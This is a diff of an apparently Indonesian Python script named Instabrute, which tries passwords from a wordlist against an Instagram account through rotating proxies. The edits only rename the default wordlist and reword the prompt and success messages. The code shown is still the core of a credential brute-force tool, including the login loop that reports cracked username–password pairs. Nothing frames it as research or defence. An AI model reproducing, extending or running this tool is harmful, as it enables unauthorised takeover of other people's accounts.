@@ -24,7 +24,7 @@ def Input(text):
 
 #The main class
 class Instabrute():
-	def __init__(self, username, passwordsFile='abc.txt'):
+	def __init__(self, username, passwordsFile='password.txt'):
 		self.username = username
 		self.CurrentProxy = ''
 		self.UsedProxys = []
@@ -139,7 +139,7 @@ class Instabrute():
 
 
 
-instabrute = Instabrute(Input('\r\n\rc1 \r     \033[1;32  Masukin Nama Akun IGnya Njinq => '))
+instabrute = Instabrute(Input('\r\n\rc1 \r     \033[1;32  Masukin Nama Akun IGnya => '))
 
 try:
 	delayLoop = int(Input('[*] Delay : ')) 
@@ -153,7 +153,7 @@ print ('')
 for password in instabrute.passwords:
 	sess = instabrute.Login(password)
 	if sess:
-		print ('=>Login Sukses Njinq %s' % [instabrute.username,password])
+		print ('=>Login Sukses Bang %s' % [instabrute.username,password])
 	else:
 		print ('[*] login gagal [%s]' % password)
 
